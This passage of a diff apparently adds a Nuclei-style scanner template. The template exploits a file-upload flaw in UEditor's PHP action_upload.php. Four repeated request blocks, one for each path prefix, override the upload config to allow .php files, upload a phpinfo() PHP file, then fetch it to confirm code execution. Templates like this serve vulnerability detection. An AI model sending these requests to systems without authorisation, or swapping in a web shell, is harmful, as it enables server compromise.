+        POST /site/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=site/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /site/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/site/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /upload/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=upload/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /upload/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/upload/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /uploads/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=uploads/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /uploads/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/uploads/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /media/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=media/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /media/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/media/ueditor/php/upload/aaaa\\.php"
